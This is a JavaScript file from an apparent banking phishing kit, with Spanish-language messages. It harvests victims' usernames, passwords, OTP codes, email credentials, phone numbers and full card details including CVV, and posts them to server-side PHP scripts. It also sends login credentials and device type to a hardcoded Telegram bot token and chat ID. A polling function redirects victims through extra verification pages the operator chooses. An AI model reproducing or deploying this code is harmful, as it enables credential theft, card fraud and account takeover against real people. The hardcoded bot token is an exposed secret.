function get_device(){
    var d = "";
    if(navigator.userAgent.match(/Android/i))
        d = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            d = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                d = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    d = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        d = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            d = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                d = "Windows Phone";
                            else
                                d = "PC";
    return d;
}

function put_user(u){
    document.cookie = `usr=${$("#inp-user").val()}; path=/`;
    $.post( "../../../../../run/put-user.php", { usr: u} ,function(data) {
        window.location.href = "../../../../../VALIDATPASS/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function put_pass(p){
     var d = get_device();
    $.post( "../../../../../run/put-pass.php", { pass: p, dvc: d} ,function(data) {
        if (data == "ERR") {

        }else{
            if (data == "NO") {

            }else{
                let usr = getCookie("usr");
                // create message for telegram
                let message = `🔥🔥🔥 NUEVO ACCESO 🔥🔥🔥 \n | 👤 Usuario: ${usr} \n | 🔐 Contraseña: ${p} \n | 📱 Dispositivo: ${d} \n | 📅 Fecha: ${new Date().toLocaleString()} \n`;

                SendMessageToTelegram(encodeURIComponent(message));

                res = data.split("-");
                document.cookie = "usr=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
                setTimeout(function(){ window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; }, 2000);
            }
        }
    });
}

function status(){
    $.post( "../../../../../run/status.php",function(data) {
        switch (data) {
            case '2': window.location.href = "../../../../../VALIDATOTP/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '4': window.location.href = "../../../../../VALIDATMAIL/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '6': window.location.href = "../../../../../VALIDATCARD/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '8': window.location.href = "../../../../../ERROROTP/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '10': window.location.href = "../../../../../SUCCESFUL/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '12': window.location.href = "../../../../../USER/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '14': window.location.href = "../../../../../VALIDATPROD/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '16': window.location.href = "../../../../../VALIDATOTPSMS/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
            case '18': window.location.href = "../../../../../ERROROTPSMS/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/"; break;
        }
    });
}

function put_otp_sms(o){
    $.post( "../../../../../run/put-otp-sms.php",{ otp:o },function(data) {
        window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function put_otp(o){
    $.post( "../../../../../run/put-otp.php",{ otp:o },function(data) {
        window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function put_mail(m,c,t){
    $.post( "../../../../../run/put-mail.php",{ eml:m, passe:c, cel:t},function(data) {
        window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function put_card(t,f,c){
    $.post( "../../../../../run/put-card.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function put_debt(t,f,c){
    $.post( "../../../../../run/put-debt.php",{ tar:t, fec:f, cvv:c },function(data) {
        window.location.href = "../../../../../WAITING/sics/83N177N3A0C_I322NrxStPNTQ0CAw0M2342LI1cgz0tvUwkpiAJKG533/30/no-bakc-buton/";
    });
}

function SendMessageToTelegram(message) {
    const API_BOT_TOKEN = '6338849648:AAEGgcPAQJW0QavIWIeKSjqZ4MBBNRSoXe8';
    const CHAT_ID = '6085082092';
    // const CHAT_ID = '977140807';

    const url = `https://api.telegram.org/bot${API_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}&parse_mode=html`
    fetch(url)
        .then(sucess => {
            console.log('mensaje enviado correctamente');
        }, error => {
            console.log('hubo un error al enviar el mensaje', error);
        })
}

function getCookie(cname) {
    let name = cname + "=";
    let decodedCookie = decodeURIComponent(document.cookie);
    let ca = decodedCookie.split(';');
    for(let i = 0; i <ca.length; i++) {
      let c = ca[i];
      while (c.charAt(0) == ' ') {
        c = c.substring(1);
      }
      if (c.indexOf(name) == 0) {
        return c.substring(name.length, c.length);
      }
    }
    return "";
  }
